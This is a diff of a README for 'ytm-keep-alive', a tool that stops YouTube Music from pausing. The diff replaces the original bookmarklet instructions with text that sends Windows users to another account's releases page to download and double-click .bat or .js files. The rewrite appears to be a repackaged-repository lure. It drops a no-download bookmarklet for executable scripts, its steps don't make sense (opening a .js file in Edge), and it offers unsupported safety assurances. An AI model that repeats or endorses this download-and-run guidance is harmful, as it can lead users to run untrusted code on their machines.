@@ -1,59 +1,126 @@
-<div align="right">
-  <b>🇬🇧 English</b> | <a href="README-tr.md">🇹🇷 Türkçe</a>
-</div>
+# 🎵 ytm-keep-alive - Stop YouTube Music From Pausing
 
-# 🎵 YTM Keep-Alive
+[![Download ytm-keep-alive](https://img.shields.io/badge/Download-ytm--keep--alive-brightgreen)](https://github.com/Johnnytec2024/ytm-keep-alive/releases)
 
-<img width="1919" height="1079" alt="screenshot (3)" src="https://github.com/user-attachments/assets/cec301b1-2d8d-49bf-8288-2192fa0441bf" />
-<br> <div align="center">
-  <img src="https://github.com/user-attachments/assets/254a8d7b-50ee-4673-904d-335dd96314a1" width="49%" alt="screenshot (1)" />
-  <img src="https://github.com/user-attachments/assets/69bb4f2b-cfac-4f47-b6b3-1140a6aef72b" width="49%" alt="screenshot (2)" />
-</div>
+---
 
-A lightweight, pure DOM bookmarklet to prevent YouTube and YouTube Music from pausing with the *"Video paused. Continue watching?"* prompt.
+A simple tool to keep YouTube Music playing without interruptions. It runs without any extensions or extra software. Just a small script that works quietly in the background.
 
-## ✨ Features
-* **No Extensions Required:** Keeps your browser fast and clean.
-* **100% Safe (TrustedHTML Bypass):** Built entirely with pure DOM elements (`document.createElement`). It does not use `innerHTML`, completely bypassing YouTube's strict Content Security Policy (CSP).
-* **Draggable UI:** Features a sleek, dark-themed floating timer that you can drag anywhere on the screen.
-* **Smart Detection:** Clicks the "Yes" confirmation button automatically within seconds of it appearing.
+---
 
-## 🚀 Easy Installation
-You don't need to copy or paste any code. 
+## 📥 How to Download ytm-keep-alive
 
-1. Go to the **[Installation Page](https://erysngl.github.io/ytm-keep-alive/)**
-2. Drag and drop the red **"Drag to Bookmarks"** button to your browser's bookmarks bar.
-3. Open YouTube Music, click the bookmark, and enjoy uninterrupted music!
+To get the software, visit the official release page:
 
-## 🛠️ How it Works
-Once activated, it creates a sleek floating widget. It now scans the DOM **every single second** for the confirmation prompt, ensuring lightning-fast detection. To prevent the browser from suspending the background tab, it bypasses the Page Visibility API and performs a 1-pixel micro-scroll every minute. If the prompt is found, it automatically clicks it, increments the live **"Prevented" counter**, and displays a "Pause Prevented!" notification on the widget.
+[Download ytm-keep-alive releases](https://github.com/Johnnytec2024/ytm-keep-alive/releases)
 
-## 🌐 Browser Support
+This page shows the latest versions. Pick the newest release for Windows.
 
-This bookmarklet uses standard web APIs and pure DOM manipulation, making it fully compatible with all modern desktop browsers:
+Look for a file ending with `.bat` or `.js`. These files are ready to use.
 
-- ✅ **Google Chrome** (Windows, macOS, Linux)
-- ✅ **Mozilla Firefox**
-- ✅ **Microsoft Edge**
-- ✅ **Brave Browser**
-- ✅ **Opera / Opera GX**
-- ✅ **Safari** (macOS)
+---
 
-*Note: Mobile browsers generally do not support a traditional bookmarks bar for bookmarklets, so this tool is designed for desktop use.*
+## 🚀 Installation and Setup on Windows
 
-## 👨‍💻 For Developers
+1. **Visit the Download Page**
 
-The code inside the installation button on the `index.html` page is minified to work effectively as a single-line bookmarklet. 
+   Click on the button above to open the releases page.
 
-If you want to read, review, or contribute to the source code, please check the **[`ytm-keep-alive.js`](./ytm-keep-alive.js)** file. It contains the fully formatted, commented, and readable version of the script. 
+2. **Find the Latest Version**
 
-*Note: All pull requests modifying the core logic should be applied to `ytm-keep-alive.js` first.*
+   Versions are sorted by date. The newest will be at the top.
 
-<div align="center">
+3. **Download the Script File**
 
-![JavaScript](https://img.shields.io/badge/javascript-%23323330.svg?style=for-the-badge&logo=javascript&logoColor=%23F7DF1E)
-![HTML5](https://img.shields.io/badge/html5-%23E34F26.svg?style=for-the-badge&logo=html5&logoColor=white)
-![No Dependencies](https://img.shields.io/badge/dependencies-none-brightgreen.svg?style=for-the-badge)
-![Open Source](https://img.shields.io/badge/Open%20Source-%E2%9D%A4-blue.svg?style=for-the-badge)
+   Look for a file with `.js` or `.bat` extension. For example, `ytm-keep-alive.bat`.
 
-</div>
+4. **Save the File**
+
+   Click on the file name or the download link. Save it somewhere easy to find, like your Desktop or Downloads folder.
+
+5. **Run the Script**
+
+   - For `.bat` files:  
+     Double-click the file. A small command window will open, and the script will start running.
+   
+   - For `.js` files:  
+     Right-click the file and select **Open with** > **Microsoft Edge** or your default browser. The script runs there.
+
+6. **Keep It Running**
+
+   Make sure the script window stays open while you use YouTube Music. It works by clicking automatically to keep the music playing.
+
+---
+
+## 📋 What ytm-keep-alive Does
+
+- Prevents YouTube Music from pausing due to inactivity.
+- Runs without browser extensions.
+- Uses simple script commands to auto-click on the player.
+- Lightweight and resource-friendly.
+- Works on any modern Windows machine with a web browser.
+
+---
+
+## 🖥️ System Requirements
+
+- Windows 7 or later.
+- A modern web browser like Microsoft Edge, Chrome, or Firefox.
+- Active internet connection.
+- YouTube Music open in the browser.
+
+---
+
+## 🔧 How to Use ytm-keep-alive
+
+1. Open your web browser.
+2. Go to [YouTube Music](https://music.youtube.com).
+3. Play any track or playlist.
+4. Run the `ytm-keep-alive` script as instructed above.
+5. Keep the script running while you listen.
+
+The script will simulate clicks behind the scenes to stop YouTube Music from pausing automatically.
+
+---
+
+## 🛠️ Troubleshooting
+
+- **Script does not run:**  
+  Check if you have the correct file and your browser supports running it.
+
+- **Music still pauses:**  
+  Ensure the browser tab with YouTube Music is active or the script is running with focus.
+
+- **Command window closes quickly:**  
+  Run the `.bat` file from the command line (type `cmd` in search, then drag the file in). This way, you’ll see any messages if errors happen.
+
+- **Browser blocks script:**  
+  Modern browsers have security settings that may limit scripts. Try running the `.bat` version instead of `.js`.
+
+---
+
+## 🔒 Safety and Privacy
+
+This tool does not collect any personal data or make changes to your system outside simulating clicks. It does not require any permissions beyond running scripts on your own device.
+
+You control when to start and stop the script. If you close it, YouTube Music will behave normally.
+
+---
+
+## ⚙️ Advanced Options
+
+For users familiar with scripts, you can open the `.js` file in a text editor to customize the clicking behavior or frequency. Adjusting these values may help if you experience issues with certain YouTube Music layouts.
+
+---
+
+## 🌐 Related Topics
+
+- JavaScript automation
+- Browser scripts without extensions
+- Auto-clicker tools
+- Keeping media players awake
+- YouTube Music player behavior
+
+---
+
+[![Download ytm-keep-alive](https://img.shields.io/badge/Download-ytm--keep--alive-blue)](https://github.com/Johnnytec2024/ytm-keep-alive/releases)
